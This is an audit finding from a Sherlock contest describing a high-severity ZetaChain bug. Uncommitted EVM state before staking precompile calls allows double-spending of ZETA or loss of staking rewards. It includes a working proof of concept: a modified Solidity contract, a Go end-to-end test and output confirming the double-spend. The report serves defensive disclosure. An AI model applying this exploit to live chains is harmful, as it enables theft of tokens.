---
tags:
  - lang/solidity
  - sector/bridge
  - sector/infra
  - sector/staking
  - sector/staking-pool
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[ZetaChain Cross Chain]]"
auditors:
  - berndartmueller
report: "https://github.com/sherlock-audit/2025-04-zetachain-cross-chain-judging"
genome:
  - "[[integer-bounds]]"
  - "[[underflow]]"
  - "[[known-pattern]]"
  - "[[math-is-safe]]"
  - "[[fix-arithmetic]]"
---
# H-2: Dirty EVM state changes are not committed before precompile calls, resulting in double-spending or loss of ZETA tokens

- id: 58632
- impact: HIGH
- protocol: ZetaChain Cross-Chain
- reporter: berndartmueller (Sherlock)
- source: N/A

## Summary


The bug report discusses an issue with the ZetaChain platform where changes made to the Ethereum Virtual Machine (EVM) state before a precompile call are not properly reflected in the Cosmos SDK state. This can lead to double-spending of native ZETA tokens and loss of staking rewards. The root cause of this issue is that the `Run()` function in ZetaChain's precompiles does not commit the current EVM state changes before executing the Cosmos SDK code. This can be mitigated by committing the EVM state changes before executing the Cosmos SDK precompile code.

## Details


Source: https://github.com/sherlock-audit/2025-04-zetachain-cross-chain-judging/issues/329 

This issue has been acknowledged by the team but won't be fixed at this time.

## Found by 
berndartmueller, stonejiajia

## Summary

"Dirty" EVM state changes before the precompile call are not committed (written) to the Cosmos SDK state. As a result, Cosmos SDK actions (e.g., delegate) operate on old state, and, **after** the precompile call, the [EVM dirty state is committed](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/ethermint/x/evm/keeper/state_transition.go#L434-L439), overwriting the changes made by the Cosmos SDK action.

Overall, this allows double-spending native ZETA tokens, and in other situations leads to loss of ZETA tokens if the state is wrongly overwritten.

## Root Cause

In ZetaChain's precompiles, the `Run()` function does not commit the current EVM state changes before executing the Cosmos SDK code. If the Cosmos SDK actions involve spending native ZETA tokens, it will either lead to double-spending or loss of tokens.

Let's focus on the most obvious areas that are affected:

### Staking ZETA tokens

Prior to the staking precompile call, if the user transfers native ZETA tokens in Solidity, the Cosmos SDK state is not updated to reflect the spent tokens.

[The `Delegate` call will then succeed](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/node/precompiles/staking/method_stake.go#L63-L70), double-spending the tokens.

Note that the explicit `stateDB.SubBalance()` call in the staking precompile is not sufficient to prevent double-spending due to the [lack of checking](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/ethermint/x/evm/statedb/statedb.go#L383-L389) if the [subtraction leads to an underflow](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/ethermint/x/evm/statedb/state_object.go#L133-L136).

[`precompiles/staking/method_stake.go#L82-L88`](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/node/precompiles/staking/method_stake.go#L82-L88)

```go
82: 	// if caller is not the same as origin it means call is coming through smart contract,
83: 	// and because state of smart contract calling precompile might be updated as well
84: 	// manually reduce amount in stateDB, so it is properly reflected in bank module
85: 	stateDB := evm.StateDB.(precompiletypes.ExtStateDB)
86: 	if contract.CallerAddress != evm.Origin {
87: 		stateDB.SubBalance(stakerAddress, amountUint256)
88: 	}
```

This explicit `SubBalance()` call is rather important to ensure that after the delegation, the EVM state is consistent with the just spent ZETA tokens. Otherwise, the ZETA tokens could be double-spent by being transferred after the precompile call.

### Claiming staking rewards

Staking rewards are either explicitly claimed by a user via calling the precompile or implicitly via [Cosmos SDK hooks when delegating/undelegating/re-delegating](https://github.com/cosmos/cosmos-sdk/blob/7b9d2ff98d02bd5a7edd3b153dd577819cc1d777/x/distribution/keeper/hooks.go#L136-L152).

If prior to the precompile call in Solidity, the withdrawer address is involved in any EVM state changes (e.g., by transferring ZETA token to/from it), the ZETA token balance at this time is cached in the EVM statedb state and not reflected in the Cosmos SDK state.

Now, when claiming and receiving the ZETA coins as staking rewards, the Cosmos SDK state is updated to reflect the balance change.

At the end of the EVM call (which contains the precompile call), the [EVM state is committed](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/ethermint/x/evm/keeper/state_transition.go#L434-L439), which [overwrites the Cosmos SDK state with the cached EVM state](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/ethermint/x/evm/statedb/statedb.go#L601-L603). As a result, it will overwrite the staking rewards that were just claimed, and the user will lose them.

## Internal Pre-conditions

None

## External Pre-conditions

None

## Attack Path

1. In Solidity, the user transfers their ZETA tokens to another address
2. Call the staking precompile method to delegate ZETA tokens
3. The precompile call will succeed, and the ZETA tokens are delegated
4. The ZETA tokens are double-spent

## Impact

- Double-spending of ZETA tokens
- Loss of ZETA staking rewards

## PoC

The following PoC runs the `precompile_contracts_staking_through_contract` e2e test and demonstrates how ZETA tokens can be double-spent by transferring them to the `0xdead` address before the precompile call.

Update the `stakeWithStateUpdate` function in [`TestStaking.sol`](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/node/e2e/contracts/teststaking/TestStaking.sol):

```solidity
function stakeWithStateUpdate(
        address staker,
        string memory validator,
        uint256 amount
) external onlyOwner returns (bool) {
    counter = counter + 1;
    // transfer full balance
    (bool success, ) = payable(address(0xdead)).call{value: payable(this).balance }("");
    require(success, "transfer to dead address failed");

    success = staking.stake(staker, validator, amount);
    counter = counter + 1;
    return success;
}
```

Generate ABI Go bindings:

```bash
go generate ./e2e/contracts/teststaking
```

Replace the existing test code in [`e2e/e2etests/test_precompiles_staking_through_contract.go`](https://github.com/sherlock-audit/2025-04-zetachain-cross-chain/blob/main/node/e2e/e2etests/test_precompiles_staking_through_contract.go) with the following:

```go
package e2etests

import (
	"math/big"

	sdk "github.com/cosmos/cosmos-sdk/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	"github.com/cosmos/cosmos-sdk/x/staking/types"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/stretchr/testify/require"

	"github.com/zeta-chain/node/cmd/zetacored/config"
	"github.com/zeta-chain/node/e2e/contracts/teststaking"
	"github.com/zeta-chain/node/e2e/runner"
	"github.com/zeta-chain/node/e2e/utils"
)

func TestPrecompilesStakingThroughContract(r *runner.E2ERunner, args []string) {
	require.Len(r, args, 0, "No arguments expected")

	testStakingAddr, testStakingTx, testStaking, err := teststaking.DeployTestStaking(
		r.ZEVMAuth,
		r.ZEVMClient,
		r.WZetaAddr,
	)
	require.NoError(r, err)
	utils.MustWaitForTxReceipt(r.Ctx, r.ZEVMClient, testStakingTx, r.Logger, r.ReceiptTimeout)

	validators, err := testStaking.GetAllValidators(&bind.CallOpts{})
	require.NoError(r, err)
	require.GreaterOrEqual(r, len(validators), 2)

	// shares are 0 for both validators at the start
	sharesBeforeVal1, err := testStaking.GetShares(&bind.CallOpts{}, testStakingAddr, validators[0].OperatorAddress)
	require.NoError(r, err)
	require.Equal(r, int64(0), sharesBeforeVal1.Int64())

	sharesBeforeVal2, err := testStaking.GetShares(&bind.CallOpts{}, testStakingAddr, validators[1].OperatorAddress)
	require.NoError(r, err)
	require.Equal(r, int64(0), sharesBeforeVal2.Int64())

	r.ZEVMAuth.Value = big.NewInt(1000000000000)
	previousGasLimit := r.ZEVMAuth.GasLimit
	r.ZEVMAuth.GasLimit = 10000000
	defer func() {
		r.ZEVMAuth.GasLimit = previousGasLimit
	}()

	// fund testStaking contract with azeta
	tx, err := testStaking.DepositWZETA(r.ZEVMAuth)
	require.NoError(r, err)
	utils.MustWaitForTxReceipt(r.Ctx, r.ZEVMClient, tx, r.Logger, r.ReceiptTimeout)
	r.ZEVMAuth.Value = big.NewInt(0)

	stakeAmount := 100000000000
	tx, err = testStaking.WithdrawWZETA(r.ZEVMAuth, big.NewInt(int64(stakeAmount)))
	require.NoError(r, err)
	utils.MustWaitForTxReceipt(r.Ctx, r.ZEVMClient, tx, r.Logger, r.ReceiptTimeout)

	expectedValAddr, err := sdk.ValAddressFromBech32(validators[0].OperatorAddress)
	require.NoError(r, err)

	// get the balance of the 0xdead evm address
	balanceDeadBeforeStake, err := r.BankClient.Balance(r.Ctx, &banktypes.QueryBalanceRequest{
		Address: sdk.AccAddress(common.HexToAddress("0xdead").Bytes()).String(),
		Denom:   config.BaseDenom,
	})
	require.NoError(r, err)

	// stake 2 more to validator1 using testStaking smart contract with smart contract state update
	tx, err = testStaking.StakeWithStateUpdate(
		r.ZEVMAuth,
		testStakingAddr,
		validators[0].OperatorAddress,
		big.NewInt(2),
	)
	require.NoError(r, err)
	receipt := utils.MustWaitForTxReceipt(r.Ctx, r.ZEVMClient, tx, r.Logger, r.ReceiptTimeout)

	// check that stake event was emitted
	stakeEvent, err := testStaking.ParseStake(*receipt.Logs[0])
	require.NoError(r, err)
	require.Equal(r, big.NewInt(2).Uint64(), stakeEvent.Amount.Uint64())
	require.Equal(r, common.BytesToAddress(expectedValAddr.Bytes()), stakeEvent.Validator)
	require.Equal(r, testStakingAddr, stakeEvent.Staker)

	// check that bank balance is 0
	balanceAfterStake, err := r.BankClient.Balance(r.Ctx, &banktypes.QueryBalanceRequest{
		Address: sdk.AccAddress(testStakingAddr.Bytes()).String(),
		Denom:   config.BaseDenom,
	})
	require.NoError(r, err)
	require.Equal(r, int64(0), balanceAfterStake.Balance.Amount.Int64())

	// get the zeta balance of the 0xdead address and subtract the balance before the stake to determine the received amount
	balanceDeadAfterStake, err := r.BankClient.Balance(r.Ctx, &banktypes.QueryBalanceRequest{
		Address: sdk.AccAddress(common.HexToAddress("0xdead").Bytes()).String(),
		Denom:   config.BaseDenom,
	})
	require.NoError(r, err)
	require.Greater(r, balanceDeadAfterStake.Balance.Amount.Int64()-balanceDeadBeforeStake.Balance.Amount.Int64(), int64(0))

	r.Logger.Info("balanceDeadAfterStake", "balance", balanceDeadAfterStake.Balance.Amount.Int64())

	// check that counter is updated
	counter, err := testStaking.Counter(&bind.CallOpts{})
	require.NoError(r, err)
	require.Equal(r, int64(2), counter.Int64())

	// check shares are set to 2
	sharesAfterVal1, err := testStaking.GetShares(&bind.CallOpts{}, testStakingAddr, validators[0].OperatorAddress)
	require.NoError(r, err)
	require.Equal(r, big.NewInt(2e18).String(), sharesAfterVal1.String())

	// check delegation amount using staking keeper query client
	delegationAfterVal1, err := r.StakingClient.Delegation(r.Ctx, &types.QueryDelegationRequest{
		DelegatorAddr: sdk.AccAddress(testStakingAddr.Bytes()).String(),
		ValidatorAddr: validators[0].OperatorAddress,
	})
	require.NoError(r, err)
	require.Equal(r, int64(2), delegationAfterVal1.DelegationResponse.Balance.Amount.Int64())
}
```

Run the test:

```bash
zetae2e run precompile_contracts_staking_through_contract --config cmd/zetae2e/config/local.yml --verbose
```

Result:

The test succeeds. ZETA tokens are sent to the `0xdead` address **and** delegated to the validator.

```bash
e2e          | starting tests
e2e          | ❓ balance of spl zrc20: no contract code at given address
e2e          | ❓ balance of sui zrc20: nil
e2e          | ❓ balance of sui token zrc20: nil
e2e          | ⏳ running   - precompile_contracts_staking_through_contract
e2e          | [INFO] balanceDeadAfterStake%!(EXTRA string=balance, int64=399999999996)
e2e          | ✅ completed - precompile_contracts_staking_through_contract (13.136586792s)
e2e          | ❓ balance of spl zrc20: no contract code at given address
e2e          | ❓ balance of sui zrc20: nil
e2e          | ❓ balance of sui token zrc20: nil
e2e          | tests finished in 18.16416425s
e2e          |  ---📈 E2E Test Report 
---
Name                                             Success    Time             Spent
precompile_contracts_staking_through_contract    ✅          18.149263083s    ZETA:298119430000000000
```

## Mitigation

Similarly to [Evmos' implementation](https://github.com/evmos/evmos/blob/0402a01c9036b40a7f47dc2fc5fb4cfae019f5f1/precompiles/common/precompile.go#L95-L99), commit the EVM state changes before executing the Cosmos SDK precompile code to ensure both states are synced.



